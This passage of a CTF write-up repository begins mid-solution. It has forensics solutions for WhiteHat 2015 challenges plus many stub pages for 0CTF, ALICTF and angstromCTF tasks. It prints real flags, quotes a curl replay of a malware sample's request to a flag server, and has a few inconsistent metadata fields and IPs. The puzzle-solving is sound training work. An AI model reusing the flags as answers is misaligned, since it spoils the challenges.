-rw-r--r--   1 xxx  xxx     326773 Jan  3 11:30 for100-14407.png
-rw-r--r--   1 xxx  xxx     326323 Jan  3 11:30 for100-24023.png
[...]
-rw-r--r--   1 xxx  xxx      64310 Jan  3 11:31 for100-36974.png
-rw-r--r--   1 xxx  xxx      19474 Jan  3 11:59 for100-7136.png
[...]
-rw-r--r--   1 xxx  xxx       9623 Jan  3 11:59 for100-57618.png
-rw-r--r--   1 xxx  xxx       9308 Jan  3 11:59 for100-57617.png
[...]
-rw-r--r--   1 xxx  xxx       1083 Jan  3 11:29 for100-9675.png
-rw-r--r--   1 xxx  xxx       1076 Jan  3 11:30 for100-21559.png
```

If you open files with size less than `20000` bytes, you see either black frames or frames with some ASCII art:

![](https://raw.githubusercontent.com/teamavidya/ctf/master/2015_whitehat_quals/ca_mau%5Bforensics100%5D/1.png)

We move these smaller frames into an individual folder `frames/`:

```bash
$ mkdir frames
$ find . -size -62k -exec mv {} frames/{} \;
$ cd frames/
```

Then, we only select those frames that show unique ASCII art and put them in a new `tiff`:

```bash
$ convert for100-21560.png for100-3078.png for100-40981.png for100-57614.png  for100-68106.png for100-7136.png stack.tiff
```

Now, we put the ASCII art pieces together as overlapping layers to complete the puzzle using `gimp`:

![](./gimp-layers.png)

The frames spell out in ASCII art - the flag is sha1(b0und__ball) == `WhiteHat{ddbae30b37b4e46bf54f91766fa02b42c4c0927d}`.

[This writeup](https://github.com/teamavidya/ctf/tree/master/2015_whitehat_quals/ca_mau%5Bforensics100%5D) achieved a better result:

![](https://raw.githubusercontent.com/teamavidya/ctf/master/2015_whitehat_quals/ca_mau%5Bforensics100%5D/balls.png)
## Other write-ups and resources

* <https://github.com/teamavidya/ctf/tree/master/2015_whitehat_quals/ca_mau%5Bforensics100%5D>
* [Vietnamese](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/)
# WhiteHat Grand Prix Qualification Round 2015: Phong Nha Ke Bang

**Category:** Forensics
**Points:** 200
**Solves:** 11
**Description:**

> Flag is transmissed over the wire, listen carefully!
> 
> Flag = WhiteHat{md5_string}
> 
> [for200_3498c3f7c12b934cc58ed892bd96b34a](for200_3498c3f7c12b934cc58ed892bd96b34a)


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://sugivo.wordpress.com/2015/10/28/whitehat-2015-global-challenge-phong-nha-ke-bang-forensic-200/>
* [Vietnamese](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/)


We are given a pcap (`for200.pcap`) inside a zip that we extract using `7z x for200_3498c3f7c12b934cc58ed892bd96b34a`.

Opening the pcap using `wireshark`, we see a lot of TCP packets.

Bu having a look at the data transmitted (`Analyze -> Follow -> TCP Stream`), we see that the data at first seems to be random.

We therefore save it as raw data `Show data as "Raw" -> Save as... => raw.bin` to get a [raw file](./raw.bin).

It turns out that this is a PCM audio file that we can import and listen to using `audacity`.

To do so, follow the following steps:

* `File -> Import -> Raw Data...`
* Set the encoding as 16-bit PCM, byte order as little-endian, channel numbers as 1 and sample rate 44100Hz as this picture demonstrates:

![](./audacity-pcm-settings.png)

You then imported a raw PCM audio file, which waveform looks like the following:

![](./waveform.png)

Side-note: Disregard the wrong audio meta-information on the left side - `audacity` seems to be buggy there.

Now just listen to it closely to hear "md5 of pcm_streaming_in_2015 all lowercase".

The flag is `27c857563887a5bea24ef240211d562b` == md5("pcm_streaming_in_2015").

## Other write-ups and resources

* <https://sugivo.wordpress.com/2015/10/28/whitehat-2015-global-challenge-phong-nha-ke-bang-forensic-200/>
* [Vietnamese](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/)
# WhiteHat Grand Prix Qualification Round 2015: Sa Pa

**Category:** Forensics
**Points:** 150
**Solves:** 5
**Description:**

> Malware tends to change its behaviors over time, can you trace it?
> 
> [for150_1fde98abea2f9b392522fd48016b24e4](for150_1fde98abea2f9b392522fd48016b24e4)


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [Tin](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/) <!-- hi Tin :) -->.

Note: This writeup is work in progress and not really finished :/

We are given a zip archive that contains a PE executable:

```bash
+bash-4.3$ file for150_1fde98abea2f9b392522fd48016b24e4 
for150_1fde98abea2f9b392522fd48016b24e4: Zip archive data, at least v2.0 to extract
$ 7z x for150_1fde98abea2f9b392522fd48016b24e4 -oout
$ cd out
$ file for150.exe
for150.exe: PE32 executable for MS Windows (console) Intel 80386 32-bit
```

Using an online Windows exectuable sandbox such as [malwr](https://malwr.com/analysis/NTVhMWU1NTQ0Y2E3NGQ0MTgxNjA3ZTZiYjQwZmJmOGQ/) or [reverse.it/hybrid-analysis.com](https://www.reverse.it/sample/668effa1a65a23fe674973bb20fe3f2c8eea0b19460d6b9319efc29f0c83f320?environmentId=1), we see that the exe contains several `.pyd` files, which are just [executables made from python code](https://docs.python.org/2/faq/windows.html)

TODO: Extract pyd files from exe -- help if you know how to do this :)

After extracting the pyd files, we can decompile them, e.g. using a [python decompiler](https://github.com/alex/python-decompiler).

Inside one of these decompiled python files, we find a HTTP GET request call to `222.255.46.146`.

By tracking this IP on sites such as [virustotal](https://www.virustotal.com/en/ip-address/222.255.46.146/information/), we find two malware analysis reports related to the same IP address:

* <https://www.virustotal.com/en/file/322172b401cf125a08d695966ed7b5cee9feaea6a4e6fc7a60c8da2c36f8ad93/analysis/>
* <https://www.virustotal.com/en/file/da13657f6e5580ff81517dc6199d0b2e2ab91a46dcab617b2db3c44dbc11454b/analysis/>

We find a HTTP GET request call to `http://222.255.46.146/g3tfla9_for100.php` with the User-Agent `Whitehat.vn`.

Replaying this request (curl ) yields the flag:


```bash
+bash-4.3$ curl http://103.237.99.150/g3tfla9_for100.php -A "Whitehat.vn" && echo
WhiteHat{1775d34e544b5b1d094e076b512130773990dbcc}
```

## Other write-ups and resources

* [Vietnamese](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/)
# WhiteHat Grand Prix Qualification Round 2015: Son Doong

**Category:** Forensics
**Points:** 400
**Solves:** 6
**Description:**

> Agent X has sacrificed himself to gather this secret from server and has said something about Diffie-Hellman before he’d gone. I have no idea how could he do that. Can you use it to reveal what’s hidden inside the pcap, and to finish his last mission.
> 
> [for400_6ff39ee5a15d48314807d2fae1ee2bd1](for400_6ff39ee5a15d48314807d2fae1ee2bd1)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Bac Ninh

**Category:** Pwnable
**Points:** 300
**Solves:** 23
**Description:**

> **Command**
> nc lab8.grandprix.whitehatvn.com 1337
> 
> nc lab8b.grandprix.whitehatvn.com 1337 (Mirror)
> 
> **Binary**
> [pwn300_1af1de1483ed9a1035f30389da6f0cfd](pwn300_1af1de1483ed9a1035f30389da6f0cfd)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Binh Dinh

**Category:** Pwnable
**Points:** 200
**Solves:** 9
**Description:**

> **Command**
> nc lab9.grandprix.whitehatvn.com 1337
> 
> nc lab9b.grandprix.whitehatvn.com 1337 (Mirror)
> 
> **Binary**
> [pwn200_042ff8169c3877701445cc40fbfcd1ac](pwn200_042ff8169c3877701445cc40fbfcd1ac)
> 
> **Note**
> cat /proc/sys/kernel/randomize_va_space
> 
> 0


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/peternguyen93/f4e9bf786c2df2ab968f>
# WhiteHat Grand Prix Qualification Round 2015: Da Lat

**Category:** Pwnable
**Points:** 100
**Solves:** 29
**Description:**

> **OS**
> Ubuntu 14.04.3 64 bit
> 
> **Command**
> nc lab7.grandprix.whitehatvn.com 1337
> 
> nc lab7b.grandprix.whitehatvn.com 1337 (Mirror)
> 
> **Binary**
> 
> [pwn100_7acd64362bec9e5a9f4df618f9b2676f](pwn100_7acd64362bec9e5a9f4df618f9b2676f)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Vung Tau

**Category:** Pwnable
**Points:** 500
**Solves:** 10
**Description:**

> **Command**
> nc lab10.grandprix.whitehatvn.com 1337
> 
> nc lab10b.grandprix.whitehatvn.com 1337 (Mirror)
> 
> **Binary**
> [pwn500_79fdafffdddb79d1d1638c0217774387](pwn500_79fdafffdddb79d1d1638c0217774387)


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/peternguyen93/c4dda7ef5dd7cb549a2f>
# WhiteHat Grand Prix Qualification Round CTF write-ups

* [https://grandprix.whitehatvn.com](https://grandprix.whitehatvn.com)
* [Scoreboard](https://ctftime.org/event/246) or [local alternative](scoreboard)

## Completed write-ups

* [forensics/ca-mau](forensics/ca-mau)
* [forensics/phong-nha-ke-bang](forensics/phong-nha-ke-bang)
* [forensics/sa-pa](forensics/sa-pa)

## External write-ups only

* [cryptography/buon-ma-thuot](cryptography/buon-ma-thuot)
* [cryptography/hoi-an](cryptography/hoi-an)
* [cryptography/tam-dao](cryptography/tam-dao)
* [pwnable/binh-dinh](pwnable/binh-dinh)
* [pwnable/vung-tau](pwnable/vung-tau)
* [reverse/dong-van](reverse/dong-van)
* [reverse/ha-long](reverse/ha-long)
* [reverse/hue](reverse/hue)
* [web/can-tho](web/can-tho)
* [web/ho-chi-minh-city](web/ho-chi-minh-city)
* [web/mui-ne](web/mui-ne)
* [web/phu-tho](web/phu-tho)

## Missing write-ups

* [cryptography/da-nang](cryptography/da-nang)
* [forensics/son-doong](forensics/son-doong)
* [pwnable/bac-ninh](pwnable/bac-ninh)
* [pwnable/da-lat](pwnable/da-lat)
* [reverse/ha-noi](reverse/ha-noi)
* [reverse/my-son](reverse/my-son)
* [reverse/trang-an](reverse/trang-an)
* [web/cat-ba](web/cat-ba)
* [web/nha-trang](web/nha-trang)
* [web/phu-quoc](web/phu-quoc)# WhiteHat Grand Prix Qualification Round 2015: Dong Van

**Category:** Reverse
**Points:** 100
**Solves:** 81
**Description:**

> Flag = WhiteHat{sha1(key)}
> 
> [re100_35d14595b17756b79556f6eca775c31a](re100_35d14595b17756b79556f6eca775c31a)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/whitehat-grand-prix-quals-2015/reversing/dong%20wan/sudhackar/README.md>
# WhiteHat Grand Prix Qualification Round 2015: Ha Long

**Category:** Reverse
**Points:** 300
**Solves:** 31
**Description:**

> Flag = WhiteHat{sha1(key)}
> 
> [re300_9fac9c87b940f14dc6c6771b9a42b81f](re300_9fac9c87b940f14dc6c6771b9a42b81f)


## Write-up

(TODO)

## Other write-ups and resources

* <http://uaf.io/reverse%20engineering/2015/07/25/WhiteHat-Contest-10-RE-300.html>
# WhiteHat Grand Prix Qualification Round 2015: Ha Noi

**Category:** Reverse
**Points:** 400
**Solves:** 9
**Description:**

> Flag = WhiteHat{sha1(key)}
> 
> [re400_4c0b2c4bf35df06563baeb972bbb98b4](re400_4c0b2c4bf35df06563baeb972bbb98b4)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Hue

**Category:** Reverse
**Points:** 450
**Solves:** 4
**Description:**

> Flag = WhiteHat{sha1(upper(key))}
> 
> [re450_93fdb21135ed900546637bf2c32764fb](re450_93fdb21135ed900546637bf2c32764fb)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/duc-le/ctf-writeups/blob/master/2015_WhiteHat_GrandPrix_Qual/RE450/writeup.md>
# WhiteHat Grand Prix Qualification Round 2015: My Son

**Category:** Reverse
**Points:** 250
**Solves:** 7
**Description:**

> Flag = WhiteHat{sha1(upper(key))}
> 
> [re250_30c938d95ddfe2969468195d980ddfd0](re250_30c938d95ddfe2969468195d980ddfd0)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Trang An

**Category:** 200
**Points:** 37
**Solves:** 
**Description:**

> Flag = WhiteHat{sha1(key)}
> 
> [re200_51fd57a89c827b64c4b9db56ea7516ac](re200_51fd57a89c827b64c4b9db56ea7516ac)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Can Tho

**Category:** Web
**Points:** 100
**Solves:** 20
**Description:**

> [http://lab5.grandprix.whitehatvn.com/web1337_21cca7b2e46ee0bcb7194c1ceca75b22/](http://lab5.grandprix.whitehatvn.com/web1337_21cca7b2e46ee0bcb7194c1ceca75b22/)
> 
> [http://lab5b.grandprix.whitehatvn.com/web1337_21cca7b2e46ee0bcb7194c1ceca75b22/](http://lab5b.grandprix.whitehatvn.com/web1337_21cca7b2e46ee0bcb7194c1ceca75b22/) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* <http://81glntd.blogspot.de/2015/10/writeup-web100-web150-whitehat.html>
# WhiteHat Grand Prix Qualification Round 2015: Cat Ba

**Category:** Web
**Points:** 250
**Solves:** 13
**Description:**

> [http://lab13.grandprix.whitehatvn.com/](http://lab13.grandprix.whitehatvn.com/)
> 
> [http://lab13b.grandprix.whitehatvn.com/](http://lab13b.grandprix.whitehatvn.com/) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Ho Chi Minh City

**Category:** Web
**Points:** 150
**Solves:** 17
**Description:**

> [http://lab3.grandprix.whitehatvn.com/](http://lab3.grandprix.whitehatvn.com/)
> 
> [http://lab3b.grandprix.whitehatvn.com/](http://lab3b.grandprix.whitehatvn.com/) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* <http://81glntd.blogspot.de/2015/10/writeup-web100-web150-whitehat.html>
# WhiteHat Grand Prix Qualification Round 2015: Mui Ne

**Category:** Web
**Points:** 200
**Solves:** 12
**Description:**

> [http://lab2.grandprix.whitehatvn.com/](http://lab2.grandprix.whitehatvn.com/])
> 
> [http://lab2b.grandprix.whitehatvn.com/](http://lab2b.grandprix.whitehatvn.com/) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/teamavidya/ctf/tree/master/2015_whitehat_quals/mui_ne%5Bweb200%5D>
* [Vietnamese](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/)
# WhiteHat Grand Prix Qualification Round 2015: Nha Trang

**Category:** Web
**Points:** 400
**Solves:** 7
**Description:**

> Free web proxy
> 
> Flag = WhiteHat{sha1(secret)}
> 
> [http://lab6.grandprix.whitehatvn.com/web400_beefb00b/web400.php](http://lab6.grandprix.whitehatvn.com/web400_beefb00b/web400.php)
> 
> [http://lab6b.grandprix.whitehatvn.com/web400_beefb00b/web400.php](http://lab6b.grandprix.whitehatvn.com/web400_beefb00b/web400.php) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Phu Quoc

**Category:** Web
**Points:** 300
**Solves:** 15
**Description:**

> [http://lab4.grandprix.whitehatvn.com/](http://lab4.grandprix.whitehatvn.com/)
> 
> [http://lab4b.grandprix.whitehatvn.com/](http://lab4b.grandprix.whitehatvn.com/) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Phu Tho

**Category:** Web
**Points:** 350
**Solves:** 5
**Description:**

> [http://lab1.grandprix.whitehatvn.com/](http://lab1.grandprix.whitehatvn.com/)
> 
> [http://lab1b.grandprix.whitehatvn.com/](http://lab1b.grandprix.whitehatvn.com/) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* [Vietnamese](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/)
# 0CTF : arsenal-8

**Category:** Crypto
**Points:** 8
**Solves:** 2
**Description:**

> There is a rumor that Arsenal F.C., Talent Yang's favourite team, always likes to set some "mission impossible" tasks for themselves.
>
> For instance, with a 0-2 home defeat against FC Barcelona they must play a great game in Camp Nou to get to the next round of UEFA Champions League. Can they fulfil this task? Decrypt the provided ciphertext to help them!
>
>
> (The executable of this challenge is similar to that of People's Square , check the slight difference and enjoy solving it)
>
>
> You should perform 2^32 single round decryption first


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : equation-2

**Category:** Crypto
**Points:** 2
**Solves:** 44
**Description:**

> Here is a RSA private key with its upper part masked. Can your recover the private key and decrypt the file?


## Write-up

(TODO)

## Other write-ups and resources

* <https://0day.work/0ctf-2016-quals-writeups/> 
* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/equation>
# 0CTF : peoples-square-6

**Category:** Crypto
**Points:** 6
**Solves:** 12
**Description:**

> People's Square (A.K.A. shenmhin guangshan in Shanghai Dialect) is a large public square in the Huangpu District of Shanghai, China.
>
> We know Talent Yang is the king of People's Square. Now he provides you a strange guessing game, and he also demonstrates his talent by giving you the result of how he tackles this task. Can you show your talent to decrypt the secret?
>
>
> file


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/peoples_square> 
# 0CTF : rsa-2

**Category:** Crypto
**Points:** 2
**Solves:** 32
**Description:**

> It seems easy, right?
>
> Tip: openssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rsa> 
# 0CTF : 3-3

**Category:** Exploit
**Points:** 3
**Solves:** 3
**Description:**

> MEMEDA: Show me your gongfu!
>
>
> ssh ctf@202.120.7.220 OR
>
> ssh ctf@202.120.7.221
>
>
> ZIP
>
>
> target: /root/flag passwd: the flag of task warmup


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : freecell-7

**Category:** Exploit
**Points:** 7
**Solves:** 0
**Description:**

> how about inviting Alphago to play [freecell](./freecell)?
>
>
> 202.120.7.216 13337
>
>
> NOTICE: this is a Cyber Grand Challenge, you will find useful information here.
>
>
> HINT1: do you know the bug in windows [freecell](./freecell)?
>
>
> HINT2: your task is to read the flag from remote server. you can find the fake flag in your binary.
>
>
> HINT3: AI is not necessary (even alphago loses!)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : jeap-10

**Category:** Exploit
**Points:** 10
**Solves:** 
**Description:**

> advancecd memcached [jeap](./jeap)
> 
> 
> 202.120.7.219 11211
> 
> 
> HINT: target server is running FreeBSD 10.2-RELEASE with only 1 cpu.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : sandbox-5

**Category:** Exploit
**Points:** 5
**Solves:** 20
**Description:**

> Escape from this broken [sandbox](./sandbox)
>
> notice: You have to solve the warmup task first. And try to get the flag at /home/[sandbox](./sandbox)/flag
>
>
> 202.120.7.207 52608


## Write-up

(TODO)

## Other write-ups and resources

* <http://pastie.org/pastes/10759675/text?key=iex4rl74vgjgd91o4yalg> 
# 0CTF : warumup-2

**Category:** Exploit
**Points:** 2
**Solves:** 83
**Description:**

> [warmup](./warmup) for pwning!
>
> Notice: This service is protected by a sandbox, you can only read the flag at /home/[warmup](./warmup)/flag
>
>
> 202.120.7.207 52608


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/0ctf2016/Warmup/98/>
* <https://www.whitehatters.academy/0ctf-2016-warmup/>
* [Japaneese](http://shift-crops.hatenablog.com/entry/2016/03/14/181405)
# 0CTF : zerostorage-6

**Category:** Exploit
**Points:** 6
**Solves:** 1
**Description:**

> Try our super secret storage service - ZeroStorage
>
> Notice: Latest Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel.
>
>
> 202.120.7.206 10101


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage> 
# 0CTF : checkin-1

**Category:** Misc
**Points:** 1
**Solves:** 887
**Description:**

> Flag is 0ctf{w3lC0m3_t0_0CTF_2016}
>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : opm-3

**Category:** Misc
**Points:** 3
**Solves:** 42
**Description:**

> 最強のヒーロー
>
> opm
>
>
> The flag is 0ctf{answer}


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/opm> 
# 0CTF : xor-painter-4

**Category:** Misc
**Points:** 4
**Solves:** 11
**Description:**

> you need a BIG screen to solve this problem xor_painter_8e926de10c2ac8b7c6be05580f7b6972.zip
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/xorpainter> 
# 0CTF : boomshakalaka-3

**Category:** Mobile
**Points:** 3
**Solves:** 35
**Description:**

> play the game, get the highest score
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://eugenekolo.com/blog/0ctf-2016-boomshakalaka-writeup/> 
* <https://github.com/p4-team/ctf/blob/master/2016-03-12-0ctf/boomshakalaka/README.md>
# 0CTF : state-of-the-art-5

**Category:** Mobile
**Points:** 5
**Solves:** 3
**Description:**

> Got me some new tricks...


## Write-up

(TODO)

## Other write-ups and resources

* <http://reyammer.blogspot.in/2016/03/from-android-art-binary-only-to-dex-yes.html> 
# 0CTF : webdroid++-7

**Category:** Mobile
**Points:** 7
**Solves:** 0
**Description:**

> Pwn the app, own the largest social engineering database in the world.
>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF write-ups

* [https://ctf.0ops.sjtu.cn/](https://ctf.0ops.sjtu.cn/)
* [Scoreboard](https://ctf.0ops.sjtu.cn/scoreboard) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [crypto/equation-2](crypto/equation-2)
* [crypto/rsa-2](crypto/rsa-2)
* [exploit/warumup-2](exploit/warumup-2)
* [exploit/zerostorage-6](exploit/zerostorage-6)
* [exploit/sandbox-5](exploit/sandbox-5)
* [mobile/boomshakalaka-3](mobile/boomshakalaka-3)
* [reverse/trace-4](reverse/trace-4)
* [web/piapiapia-6](web/piapiapia-6)
* [web/monkey-4](web/monkey-4)
* [web/rand_2-2](web/rand_2-2)
* [web/guestbook-1-7](web/guestbook-1-7)
* [Dragon Sector write-ups](http://dragonsector.pl/docs/0ctf2016_writeups.pdf) (web/monkey-4, web/rand_r-2, web/piapiapia-6, pwn/(* ￣3)(ε￣ *)-8, misc/xor_painter-4, re/momo-3, mobile/boomshakalaka-3, pwn/sandbox-5, crypto/equation-3, re/trace-4, crypto/rsa-2, pwn/warmup-2, misc/0pm-3, mobile/state-of-the-art-5)

## Missing write-ups

* [crypto/arsenal-8](crypto/arsenal-8)
* [crypto/peoples-square-6](crypto/peoples-square-6)
* [exploit/3-3](exploit/3-3)
* [exploit/freecell-7](exploit/freecell-7)
* [exploit/jeap-10](exploit/jeap-10)
* [misc/checkin-1](misc/checkin-1)
* [misc/opm-3](misc/opm-3)
* [misc/xor-painter-4](misc/xor-painter-4)
* [mobile/state-of-the-art-5](mobile/state-of-the-art-5)
* [mobile/webdroid++-7](mobile/webdroid++-7)
* [reverse/momo-3](reverse/momo-3)
* [reverse/overheard-6](reverse/overheard-6)
* [reverse/papi-8](reverse/papi-8)
* [reverse/vm-7](reverse/vm-7)
* [web/guestbook-2-7](web/guestbook-2-7)
# 0CTF : momo-3

**Category:** Reverse
**Points:** 3
**Solves:** 31
**Description:**

> I think it's hard winning a war with words.
>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : overheard-6

**Category:** Reverse
**Points:** 6
**Solves:** 4
**Description:**

> There is something inside, that they can't get to, that they can't touch. That's yours.
>
>
> file
>
>
> Hint1 <http://comments.gmane.org/gmane.network.routing.babel.user/1526>
>
>
> sysctl net.core.optmem_max=67108860


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : papi-8

**Category:** Reverse
**Points:** 8
**Solves:** 0
**Description:**

> Program Analysis and Program Implementation.
>
>
> nc 202.120.7.205 20143


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : trace-4

**Category:** Reverse
**Points:** 4
**Solves:** 33
**Description:**

> follow the trace trace.log
>
>
> update:
>
>
> the flag is at 0x400D80
>
>
> *(uint32_t*)0x00410EA0 == 0x400D80


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/trace> 
# 0CTF : vm-7

**Category:** Reverse
**Points:** 7
**Solves:** 4
**Description:**

> You are (not) virtual.
>
>
> vm_bfd6ae310ab1c8c58437edb8b7df85cf
>
>
> update: here is a new binary comilped in i686 from same source code [vm_recompile_00ce14276b4c33048ed3b3d48dbfcde7](./vm_recompile_00ce14276b4c33048ed3b3d48dbfcde7)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 0CTF : guestbook-1-7

**Category:** Web
**Points:** 7
**Solves:** 16
**Description:**

> the flag is in the http-only cookie
>
>
> <http://202.120.7.201:8888>


## Write-up

(TODO)

## Other write-ups and resources

* <https://tsublogs.wordpress.com/2016/03/14/0ctf-2016-quals-guestbook1-7-pts/> 
* <http://security.szurek.pl/0ctf-2016-guestbook-1-writeup.html>
* [Spanish](https://blog.ka0labs.net/post/33/)
# 0CTF : guestbook-2-7

**Category:** Web
**Points:** 7
**Solves:** 2
**Description:**

> try to get a bash shell and get the flag at /flag
>
>
> <http://202.120.7.201:8888>


## Write-up

(TODO)

## Other write-ups and resources

* [Spanish](https://blog.ka0labs.net/post/33/) 
# 0CTF : monkey-4

**Category:** Web
**Points:** 4
**Solves:** 35
**Description:**

> What is Same Origin Policy?
>
>
> you can test this problem on your local machine
>
>
> <http://202.120.7.200>


## Write-up

(TODO)

## Other write-ups and resources

 * <https://dollberg.xyz/ctf/2016/03/13/0CTF-Monkey-Writeup/>
 * <https://secgroup.github.io/2016/03/14/0ctf-writeup-monkey/>
 * <http://zepvn.com/2016-03-14-0ctf-2016-monkey.html>
 * <https://w00tsec.blogspot.de/2016/03/0ctf-2016-write-up-monkey-web-4.html>
 * <http://www.isecer.com/ctf/0ctf_2016_web_writeup_monkey.html>
# 0CTF : piapiapia-6

**Category:** Web
**Points:** 6
**Solves:** 38
**Description:**

> pia! pia! pia! <http://202.120.7.203:8888/> Source code is in here


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/piapiapia> 
* [Chineese](http://www.isecer.com/ctf/0ctf_2016_web_writeup_piapiapia.html)
# 0CTF : rand_2-2

**Category:** Web
**Points:** 2
**Solves:** 39
**Description:**

> Do you believe it, can you recieve it?
>
>
> <http://202.120.7.202:8888/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rand_2> 
* [Chineese](http://www.isecer.com/ctf/0ctf_2016_web_writeup_rand_2.html)
# ALICTF 2016 : showmethemoney-50

**Category:** Crypto
**Points:** 50
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ALICTF 2016 : fb-100

**Category:** Pwn
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/murmus/ctf/blob/master/events/alictf2016/fb/sploit.py
# ALICTF 2016 write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [reversing/LoopAndLoop-100](reversing/LoopAndLoop-100)
* [reversing/ColorOverflow-100](reversing/ColorOverflow-100)
* [pwn/fb-100](pwn/fb-100)
* [web/Homework-400](web/Homework-400)

## Missing write-ups

* [pwn/fb-100](pwn/fb-100)
* [crypto/showmethemoney-50](crypto/showmethemoney-50)
* [web/FinalBook-100](web/FinalBook-100)
# ALICTF 2016 : ColorOverflow-100

**Category:** Reversing
**Points:** 100
**Solves:** 
**Description:**

> ctf=Capture The traFfic?
> 
> HINT: port 5555


## Write-up

(TODO)

## Other write-ups and resources

* http://quanyang.github.io/alictf-2016-coloroverflow/
# ALICTF 2016 : LoopAndLoop-100

**Category:** Reversing
**Points:** 100
**Solves:** 
**Description:**

> The friendship between native and dex.


## Write-up

(TODO)

## Other write-ups and resources

* http://quanyang.github.io/alictf-2016-loopandloop-reversing-100/
# ALICTF 2016 : FinalBook-100

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ALICTF 2016 : Homework-400

**Category:** Web
**Points:** 400
**Solves:** 
**Description:**

> It's time to submit your homework. But I'm sure the teacher is too busy to check your homework.


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/tothi/ctfs/tree/master/alictf-2016/homework
* http://lorexxar.cn/2016/06/06/alictf2016/
# angstromCTF 2016 : answer-machine-110

**Category:** Binary
**Points:** 
**Solves:** 
**Description:**

> This answering machine program has ASLR enabled and a non-executable stack! Can you leave a message that bypasses them and gets the flag? Find it on the shell server at /problems/[answer_machine](./answer_machine)/, and download the binary and source. 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : endian-of-the-world-40

**Category:** Binary
**Points:** 
**Solves:** 
**Description:**

> The end of the world is nigh! Dr. Doomsday has created an evil contraption to destroy the planet, and only a single password can stop it! We were able to recover the source code for the password check. Find the shortest password that will stop Dr. Doomsday's machine and save the world! The program is available on the shell server at /problems/[endian](./endian)_of_the_world/, and the binary and source are provided. 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-endian-of-the-world/
* http://ipushino.blogspot.com/2016/04/angstromctf-2016-endian-of-world-binary.html
# angstromCTF 2016 : format1-100

**Category:** Binary
**Points:** 
**Solves:** 
**Description:**

> This program is vulnerable to a format string attack! Try supplying a format string to overwrite a global variable and get a shell! You can exploit the binary on our shell server at /problems/[format1](./format1)/. Download the binary here, and source code is available here 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-format-1/
* https://youtu.be/AGHW9nf_oVo
